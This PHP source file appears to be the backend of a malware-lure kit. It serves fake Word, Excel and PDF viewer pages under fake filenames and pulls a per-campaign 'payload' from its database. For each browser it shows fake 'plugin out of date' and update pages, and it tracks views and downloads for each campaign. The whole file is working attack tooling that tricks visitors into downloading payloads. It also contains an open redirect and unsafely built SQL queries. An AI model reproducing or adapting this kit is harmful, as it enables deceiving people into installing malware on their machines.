<?php 

	header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
	header("Cache-Control: post-check=0, pre-check=0", false);
	header("Pragma: no-cache");

	include('../config.php');
	include('../mDetect.php');
	include('../manager/functions.php');
	
	$detect = new Mobile_Detect;
	
	if(isset($_POST['dl']) && $_POST['dl'] == 'wo'){
		
		$name = $_POST['cname'];
		$link = $_POST['link'];
		update_dc($name);
		setcookie('downloadErrorWORD'.$method, '0', time()+60*60*24, '/view/');
		header("Location:".$link);
		die();
		
	}
	
	if(isset($_POST['dl']) && $_POST['dl'] == 'ex'){
		
		$name = $_POST['cname'];
		$link = $_POST['link'];
		update_dc($name);
		setcookie('downloadErrorEXCEL'.$method, '0', time()+60*60*24, '/view/');
		header("Location:".$link);
		die();
		
	}
	
	if(isset($_POST['dl']) && $_POST['dl'] == 'dlPDF'){
		
		$name = $_POST['cname'];
		$link = $_POST['link'];
		update_dc($name);
		setcookie('downloadErrorPDF'.$method, '0', time()+60*60*24, '/view/');
		header("Location:".$link);
		die();
		
	}
	
	if(isset($_POST['dl']) && $_POST['dl'] == 'dlPDF2'){
		
		$name = $_POST['cname'];
		update_dc($name);
		setcookie('downloadErrorPDF'.$method, '0', time()+60*60*24, '/view/');
		die();
		
	}
	
	if(isset($_GET['Word'])){
		
		$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
		mysql_select_db(DB_NAME, $link);
		mysql_set_charset("utf8");
		
		$cname = strip_tags($_GET['user']);
		$cname = htmlspecialchars($cname);
		$cname = mysql_real_escape_string($cname);
		
		$method = "WORD";
		$sql_query = "SELECT * FROM clients WHERE name = '$cname' AND method = '$method'";
		$do_q = mysql_query($sql_query);
						
		$sql_r4 = "SELECT * FROM settings";
		$r4 = mysql_fetch_array(mysql_query($sql_r4));
		
		$r4iOS = $r4['redirect_ios'];
		$r4Droid = $r4['redirect_android'];
		$detect = new Mobile_Detect;
		
		if(mysql_num_rows($do_q) != 0){
			
			$result_q = mysql_fetch_array($do_q);

			if($_GET['Word'] == $result_q['fakefn']){
				
				$lang_name = $result_q['lang'];
				$sql_settings = "SELECT * FROM settings";
				$sql_lang = "SELECT * FROM languages WHERE name = '$lang_name'";
				$do_settings = mysql_query($sql_settings);
				$do_lang = mysql_query($sql_lang);
				$result_settings = mysql_fetch_array($do_settings);
				$result_l = mysql_fetch_array($do_lang);
				
				if($result_settings['autodetect_language'] == 0){
					$lang_file_ext = $result_l['filename'];
					$lang_name = $result_l['name'];
				}else{
					$lang_file_ext = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2).'.lang';
					if(file_exists($lang_directory.$lang_file_ext)){
						$sql_lang = "SELECT * FROM languages WHERE filename = '$lang_file_ext'";
						$do_lang = mysql_query($sql_lang);
						$result_l = mysql_fetch_array($do_lang);
						$lang_name = $result_l['name'];
					}else{
						$lang_file_ext = "en.lang";
						$lang_name = "EN";
					}
				}
				
				$method = "_".$result_q['method'].'_';
				$domain_allowed = $result_q['domain'];
				$filename = $result_q['fakefn'];
				
				$domain = $result_q['domain'];
				$protocol = 'http://';
				$sql_check_domain = "SELECT * FROM domains WHERE name = '$domain'";
				$do_check_domain = mysql_query($sql_check_domain);
				$domain_result = mysql_fetch_array($do_check_domain);
				
				if($domain_result['ssl'] == '1'){
					$protocol = 'https://';
				}
				
				$methods_path = $protocol.$methods_path['WORD'];
				$lang_img_directory = $protocol.$lang_img_directory;
				
				if($result_q['personal'] == '0'){
					$template = $result_q['template'];
					$sql_query_template = "SELECT * FROM templates WHERE name = '$template'";
					$do_t = mysql_query($sql_query_template);
					$result_t = mysql_fetch_array($do_t);
					$content = $result_t['text'];
				}else{
					$sql_query_template = "SELECT * FROM personal_templates WHERE client = '$cname'";
					$do_t = mysql_query($sql_query_template);
					$result_t = mysql_fetch_array($do_t);
					$content = $result_t['template'];
				}			
				
				if($_SERVER['SERVER_NAME'] == $domain_allowed){
					
					if(file_exists($lang_directory.$lang_file_ext)){
						
						$lang_file_content = json_decode(file_get_contents($lang_directory.$lang_file_ext), true);			
						
						$PAGE_TITLE_WORD = $lang_file_content['PAGE_TITLE_WORD'];
						$GET_WORD = $lang_file_content['GET_WORD'];
						$MSG_TITLE = $lang_file_content['MSG_TITLE'];
						$MSG_SUBTITLE = $lang_file_content['MSG_SUBTITLE'];
						$MSG_BTN_LEFT = $lang_file_content['MSG_BTN_LEFT'];
						$MSG_BTN_RIGHT = $lang_file_content['MSG_BTN_RIGHT'];
						$MSG_LINK_ONE = $lang_file_content['MSG_LINK_ONE'];
						$MSG_LINK_TWO = $lang_file_content['MSG_LINK_TWO'];
						
						$MSG_PLUGIN_VERSION = $lang_file_content['MSG_PLUGIN_VERSION'];
						$MSG_FOOTER_CHANGE_LANG = $lang_file_content['MSG_FOOTER_CHANGE_LANG'];
						$MSG_FOOTER_CHANGE_ACCESSIBILITY = $lang_file_content['MSG_FOOTER_CHANGE_ACCESSIBILITY'];
						$MSG_FOOTER_CHANGE_PRIVACY_AND_COOKIES = $lang_file_content['MSG_FOOTER_CHANGE_PRIVACY_AND_COOKIES'];
						$MSG_FOOTER_CHANGE_LEGAL = $lang_file_content['MSG_FOOTER_CHANGE_LEGAL'];
						$MSG_FOOTER_CHANGE_TRADEMARKS = $lang_file_content['MSG_FOOTER_CHANGE_TRADEMARKS'];
						
						update_vc($cname);
						send_stats($cname);
						
						if($detect->isMobile() || $detect->isTablet()){
							if($detect->isiOS() && $r4iOS != '0'){
								@header("Location: $r4iOS");
							}
							if($detect->isiOS() && $r4iOS == '0'){
								@header("Location: ../../../../../error");
							}
							if($detect->isAndroidOS() && $r4Droid != '0'){
								@header("Location: $r4Droid");
							}
							if($detect->isAndroidOS() && $r4Droid == '0'){
								@header("Location: ../../../../../error");
							}
						}else{
							require('./word_m/index.tpl');
						}
						
					}else{
						@header("Location: ".REDIRECT_LANGFILE_NOT_EXISTS);			
					}
				
				}else{
					@header("Location: ".REDIRECT_WRONG_DOMAIN);
				}			
				
			}else{
				@header("Location: ".REDIRECT_WRONG_FILENAME);
			}

		}else{
			@header("Location: ".REDIRECT_WRONG_CLIENT);
		}
		
	}elseif(isset($_GET['Excel'])){
		
		$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
		mysql_select_db(DB_NAME, $link);
		mysql_set_charset("utf8");
		
		$cname = strip_tags($_GET['user']);
		$cname = htmlspecialchars($cname);
		$cname = mysql_real_escape_string($cname);
		
		$method = "EXCEL";
		$sql_query = "SELECT * FROM clients WHERE name = '$cname' AND method = '$method'";
		$do_q = mysql_query($sql_query);
						
		$sql_r4 = "SELECT * FROM settings";
		$r4 = mysql_fetch_array(mysql_query($sql_r4));
		
		$r4iOS = $r4['redirect_ios'];
		$r4Droid = $r4['redirect_android'];
		$detect = new Mobile_Detect;
		
		if(mysql_num_rows($do_q) != 0){
			
			$result_q = mysql_fetch_array($do_q);

			if($_GET['Excel'] == $result_q['fakefn']){
				
				$lang_name = $result_q['lang'];
				$sql_settings = "SELECT * FROM settings";
				$sql_lang = "SELECT * FROM languages WHERE name = '$lang_name'";
				$do_settings = mysql_query($sql_settings);
				$do_lang = mysql_query($sql_lang);
				$result_settings = mysql_fetch_array($do_settings);
				$result_l = mysql_fetch_array($do_lang);
				
				if($result_settings['autodetect_language'] == 0){
					$lang_file_ext = $result_l['filename'];
					$lang_name = $result_l['name'];
				}else{
					$lang_file_ext = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2).'.lang';
					if(file_exists($lang_directory.$lang_file_ext)){
						$sql_lang = "SELECT * FROM languages WHERE filename = '$lang_file_ext'";
						$do_lang = mysql_query($sql_lang);
						$result_l = mysql_fetch_array($do_lang);
						$lang_name = $result_l['name'];
					}else{
						$lang_file_ext = "en.lang";
						$lang_name = "EN";
					}
				}
				
				$method = "_".$result_q['method'].'_';
				$domain_allowed = $result_q['domain'];
				$filename = $result_q['fakefn'];
				
				$domain = $result_q['domain'];
				$protocol = 'http://';
				$sql_check_domain = "SELECT * FROM domains WHERE name = '$domain'";
				$do_check_domain = mysql_query($sql_check_domain);
				$domain_result = mysql_fetch_array($do_check_domain);
				
				if($domain_result['ssl'] == '1'){
					$protocol = 'https://';
				}
				
				$methods_path = $protocol.$methods_path['EXCEL'];
				$lang_img_directory = $protocol.$lang_img_directory;
				
				if($result_q['personal'] == '0'){
					$template = $result_q['template'];
					$sql_query_template = "SELECT * FROM templates WHERE name = '$template'";
					$do_t = mysql_query($sql_query_template);
					$result_t = mysql_fetch_array($do_t);
					$content = $result_t['text'];
				}else{
					$sql_query_template = "SELECT * FROM personal_templates WHERE client = '$cname'";
					$do_t = mysql_query($sql_query_template);
					$result_t = mysql_fetch_array($do_t);
					$content = $result_t['template'];
				}
				
				if($_SERVER['SERVER_NAME'] == $domain_allowed){
					
					if(file_exists($lang_directory.$lang_file_ext)){
						
						$lang_file_content = json_decode(file_get_contents($lang_directory.$lang_file_ext), true);			
						
						$PAGE_TITLE_EXCEL = $lang_file_content['PAGE_TITLE_EXCEL'];
						$GET_EXCEL = $lang_file_content['GET_EXCEL'];
						$MSG_TITLE = $lang_file_content['MSG_TITLE'];
						$MSG_SUBTITLE = $lang_file_content['MSG_SUBTITLE'];
						$MSG_BTN_LEFT = $lang_file_content['MSG_BTN_LEFT'];
						$MSG_BTN_RIGHT = $lang_file_content['MSG_BTN_RIGHT'];
						$MSG_LINK_ONE = $lang_file_content['MSG_LINK_ONE'];
						$MSG_LINK_TWO = $lang_file_content['MSG_LINK_TWO'];
						
						$MSG_PLUGIN_VERSION = $lang_file_content['MSG_PLUGIN_VERSION'];
						$MSG_FOOTER_CHANGE_LANG = $lang_file_content['MSG_FOOTER_CHANGE_LANG'];
						$MSG_FOOTER_CHANGE_ACCESSIBILITY = $lang_file_content['MSG_FOOTER_CHANGE_ACCESSIBILITY'];
						$MSG_FOOTER_CHANGE_PRIVACY_AND_COOKIES = $lang_file_content['MSG_FOOTER_CHANGE_PRIVACY_AND_COOKIES'];
						$MSG_FOOTER_CHANGE_LEGAL = $lang_file_content['MSG_FOOTER_CHANGE_LEGAL'];
						$MSG_FOOTER_CHANGE_TRADEMARKS = $lang_file_content['MSG_FOOTER_CHANGE_TRADEMARKS'];
						
						update_vc($cname);
						send_stats($cname);
						
						if($detect->isMobile() || $detect->isTablet()){
							if($detect->isiOS() && $r4iOS != '0'){
								@header("Location: $r4iOS");
							}
							if($detect->isiOS() && $r4iOS == '0'){
								@header("Location: ../../../../../error");
							}
							if($detect->isAndroidOS() && $r4Droid != '0'){
								@header("Location: $r4Droid");
							}
							if($detect->isAndroidOS() && $r4Droid == '0'){
								@header("Location: ../../../../../error");
							}
						}else{							
							require('./excel_m/index.tpl');
						}
						
					}else{
						@header("Location: ".REDIRECT_LANGFILE_NOT_EXISTS);			
					}
				
				}else{
					@header("Location: ".REDIRECT_WRONG_DOMAIN);
				}
				
			}else{
				@header("Location: ".REDIRECT_WRONG_FILENAME);
			}

		}else{
			@header("Location: ".REDIRECT_WRONG_CLIENT);
		}
		
	}elseif(isset($_GET['PDF'])){
		
		$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
		mysql_select_db(DB_NAME, $link);
		mysql_set_charset("utf8");
		
		$cname = strip_tags($_GET['user']);
		$cname = htmlspecialchars($cname);
		$cname = mysql_real_escape_string($cname);
		
		$method = 'PDF';
		$sql_query = "SELECT * FROM clients WHERE name = '$cname' AND method = '$method'";
		$do_q = mysql_query($sql_query);
						
		$sql_r4 = "SELECT * FROM settings";
		$r4 = mysql_fetch_array(mysql_query($sql_r4));
		
		$r4iOS = $r4['redirect_ios'];
		$r4Droid = $r4['redirect_android'];
		$detect = new Mobile_Detect;
		
		if(mysql_num_rows($do_q) != 0){
			
			$result_q = mysql_fetch_array($do_q);
			$pdf_ver = $result_q['ver'];

			if($_GET['PDF'] == $result_q['pdf_file']){
				
				$lang_name = $result_q['lang'];
				$sql_settings = "SELECT * FROM settings";
				$sql_lang = "SELECT * FROM languages WHERE name = '$lang_name'";
				$do_settings = mysql_query($sql_settings);
				$do_lang = mysql_query($sql_lang);
				$result_settings = mysql_fetch_array($do_settings);
				$result_l = mysql_fetch_array($do_lang);
				
				if($result_settings['autodetect_language'] == 0){
					$lang_file_ext = $result_l['filename'];
					$lang_name = $result_l['name'];
				}else{
					$lang_file_ext = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2).'.lang';
					if(file_exists($lang_directory.$lang_file_ext)){
						$sql_lang = "SELECT * FROM languages WHERE filename = '$lang_file_ext'";
						$do_lang = mysql_query($sql_lang);
						$result_l = mysql_fetch_array($do_lang);
						$lang_name = $result_l['name'];
					}else{
						$lang_file_ext = "en.lang";
						$lang_name = "EN";
					}
				}				
				
				$method = "_".$result_q['method'].'_';
				$domain_allowed = $result_q['domain'];
				$file_to_read = $result_q['pdf_file'];
				
				$domain = $result_q['domain'];
				$protocol = 'http://';
				$sql_check_domain = "SELECT * FROM domains WHERE name = '$domain'";
				$do_check_domain = mysql_query($sql_check_domain);
				$domain_result = mysql_fetch_array($do_check_domain);
				
				if($domain_result['ssl'] == '1'){
					$protocol = 'https://';
				}
				
				$pdf_link = $protocol.$pdf_4js_path.$file_to_read;
				
				$pdf_m_path = $protocol.$pdf_m_path;
				
				if($_SERVER['SERVER_NAME'] == $domain_allowed){
					
					if(file_exists($lang_directory.$lang_file_ext) && file_exists($pdf_file_directory.$file_to_read)){
						
						$lang_file_content = json_decode(file_get_contents($lang_directory.$lang_file_ext), true);			
						//PDFV1
						$PDF_CHROME_AW_SNAP = $lang_file_content['PDF_CHROME_AW_SNAP'];
						$PDF_CHROME_TXT = $lang_file_content['PDF_CHROME_TXT'];
						$PDF_CHROME_BUTTON = $lang_file_content['PDF_CHROME_BUTTON'];
						
						$PDF_OPERA_TITLE = $lang_file_content['PDF_OPERA_TITLE'];
						$PDF_OPERA_TXT = $lang_file_content['PDF_OPERA_TXT'];
						$PDF_OPERA_BUTTON = $lang_file_content['PDF_OPERA_BUTTON'];
						$PDF_OPERA_TXT_FTS = $lang_file_content['PDF_OPERA_TXT_FTS'];
						$PDF_OPERA_TXT_S1 = $lang_file_content['PDF_OPERA_TXT_S1'];
						$PDF_OPERA_TXT_S2 = $lang_file_content['PDF_OPERA_TXT_S2'];
						$PDF_OPERA_TXT_S3 = $lang_file_content['PDF_OPERA_TXT_S3'];
						
						$PDF_IE_TITLE = $lang_file_content['PDF_IE_TITLE'];
						$PDF_IE_TXT = $lang_file_content['PDF_IE_TXT'];
						$PDF_IE_TXT_S1 = $lang_file_content['PDF_IE_TXT_S1'];
						$PDF_IE_TXT_S2 = $lang_file_content['PDF_IE_TXT_S2'];
						$PDF_IE_TXT_S3 = $lang_file_content['PDF_IE_TXT_S3'];
						$PDF_IE_BUTTON = $lang_file_content['PDF_IE_BUTTON'];
						
						$PDF_FF_AW_SNAP = $lang_file_content['PDF_FF_AW_SNAP'];
						$PDF_FF_TXT1 = $lang_file_content['PDF_FF_TXT1'];
						$PDF_FF_TXT2 = $lang_file_content['PDF_FF_TXT2'];
						$PDF_FF_BTN = $lang_file_content['PDF_FF_BTN'];
						
						//PDFV2
						
						$PDF_2_CHROME_TABTOP = $lang_file_content['PDF_2_CHROME_TABTOP'];
						$PDF_2_CHROME_HEADER = $lang_file_content['PDF_2_CHROME_HEADER'];
						$PDF_2_CHROME_TEXT = $lang_file_content['PDF_2_CHROME_TEXT'];
						$PDF_2_CHROME_CHECKING = $lang_file_content['PDF_2_CHROME_CHECKING'];
						$PDF_2_CHROME_UPDATE = $lang_file_content['PDF_2_CHROME_UPDATE'];
						$PDF_2_CHROME_TEXT_BOTTOM = $lang_file_content['PDF_2_CHROME_TEXT_BOTTOM'];
						$PDF_2_CHROME_VERSION_OUTOFDATE = $lang_file_content['PDF_2_CHROME_VERSION_OUTOFDATE'];
						$PDF_2_CHROME_VERSION = $lang_file_content['PDF_2_CHROME_VERSION'];
						$PDF_2_CHROME_OFFICIAL_BUILD = $lang_file_content['PDF_2_CHROME_OFFICIAL_BUILD'];
						
						$PDF_2_FF_HEADER = $lang_file_content['PDF_2_FF_HEADER'];
						$PDF_2_FF_TEXT = $lang_file_content['PDF_2_FF_TEXT'];
						$PDF_2_FF_C4U = $lang_file_content['PDF_2_FF_C4U'];
						$PDF_2_FF_UPDATE_PLUGIN = $lang_file_content['PDF_2_FF_UPDATE_PLUGIN'];
						$PDF_2_FF_THIS_VER_IS_OOD = $lang_file_content['PDF_2_FF_THIS_VER_IS_OOD'];
						
						$PDF_2_IE_COPYRIGHT = $lang_file_content['PDF_2_IE_COPYRIGHT'];
						$PDF_2_IE_H2 = $lang_file_content['PDF_2_IE_H2'];
						$PDF_2_IE_TEXT = $lang_file_content['PDF_2_IE_TEXT'];
						$PDF_2_IE_DOWNLOAD = $lang_file_content['PDF_2_IE_DOWNLOAD'];
						$PDF_2_IE_TOU = $lang_file_content['PDF_2_IE_TOU'];
						$PDF_2_IE_P = $lang_file_content['PDF_2_IE_P'];
						
						$PDF_2_OPERA_H2 = $lang_file_content['PDF_2_OPERA_H2'];
						$PDF_2_OPERA_TEXT = $lang_file_content['PDF_2_OPERA_TEXT'];
						$PDF_2_OPERA_DOWNLOAD = $lang_file_content['PDF_2_OPERA_DOWNLOAD'];
						$PDF_2_OPERA_LICENSE = $lang_file_content['PDF_2_OPERA_LICENSE'];
						$PDF_2_OPERA_PRIVACY = $lang_file_content['PDF_2_OPERA_PRIVACY'];
						
						$PDF_3_COPYRIGHT = $lang_file_content['PDF_3_COPYRIGHT'];
						$PDF_3_H2 = $lang_file_content['PDF_3_H2'];
						$PDF_3_TEXT = $lang_file_content['PDF_3_TEXT'];
						$PDF_3_DOWNLOAD = $lang_file_content['PDF_3_DOWNLOAD'];
						$PDF_3_TERMS = $lang_file_content['PDF_3_TERMS'];
						$PDF_3_PRIVACY = $lang_file_content['PDF_3_PRIVACY'];
						
						update_vc($cname);
						send_stats($cname);
						
						$payload = $result_q['payload'];
						
						if($detect->isMobile() || $detect->isTablet()){
							if($detect->isiOS() && $r4iOS != '0'){
								@header("Location: $r4iOS");
							}
							if($detect->isiOS() && $r4iOS == '0'){
								@header("Location: ../../../../../error");
							}
							if($detect->isAndroidOS() && $r4Droid != '0'){
								@header("Location: $r4Droid");
							}
							if($detect->isAndroidOS() && $r4Droid == '0'){
								@header("Location: ../../../../../error");
							}
						}else{
							if($pdf_ver == '1'){
								require('./pdf_m/index.tpl');
							}elseif($pdf_ver == '2'){
								$browser = get_browser_name($_SERVER['HTTP_USER_AGENT']);
								if(!isset($_COOKIE['downloadErrorPDF'])){
									$pdf_link = $protocol.$pdf_4js_path.'system/system_errd.pdf';
								}
								if($browser == 'chrome'){
									$pdf_v2_path = $pdf_v2_path.'chrome/';
									require('./pdf_v2/chrome/index.tpl');
								}elseif($browser == 'opera'){
									$pdf_v2_path = $pdf_v2_path.'opera/';
									require('./pdf_v2/opera/index.tpl');									
								}elseif($browser == 'ie'){
									$pdf_v2_path = $pdf_v2_path.'ie/';
									if(!isset($_COOKIE['downloadErrorPDF'])){
										require('./pdf_v2/ie/index.tpl');
									}else{
										require('./pdf_v2/ie/index_pdf.tpl');
									}									
								}elseif($browser == 'firefox'){
									$pdf_v2_path = $pdf_v2_path.'firefox/';
									require('./pdf_v2/firefox/index.tpl');									
								}else{
									
								}
							}elseif($pdf_ver == '3'){
								if(!isset($_COOKIE['downloadErrorPDF'])){
									$pdf_link = $protocol.$pdf_4js_path.'system/system_errd.pdf';
								}
								$browser = get_browser_name($_SERVER['HTTP_USER_AGENT']);
								if($browser == 'chrome'){
									$browser = 'Google Chrome';
								}elseif($browser == 'firefox'){
									$browser = 'Mozilla Firefox';
								}elseif($browser == 'opera'){
									$browser = 'Opera';
								}elseif($browser == 'ie'){
									$browser = 'Internet Explorer / Edge';
								}else{
									$browser = 'web-browser';
								}
								
								if(!isset($_COOKIE['downloadErrorPDF'])){
									require('./pdf_v3/index.tpl');
								}else{
									require('./pdf_v3/index_pdf.tpl');
								}	
							}
						}
						
					}else{
						@header("Location: ".REDIRECT_LANGFILE_OR_PDF_FILE_NOT_EXISTS);			
					}
				
				}else{
					@header("Location: ".REDIRECT_WRONG_DOMAIN);
				}
				
			}else{
				@header("Location: ".REDIRECT_WRONG_FILENAME);
			}

		}else{
			@header("Location: ".REDIRECT_WRONG_CLIENT);
		}			
	}else{
		@header("Location:./error");
	}
	
?>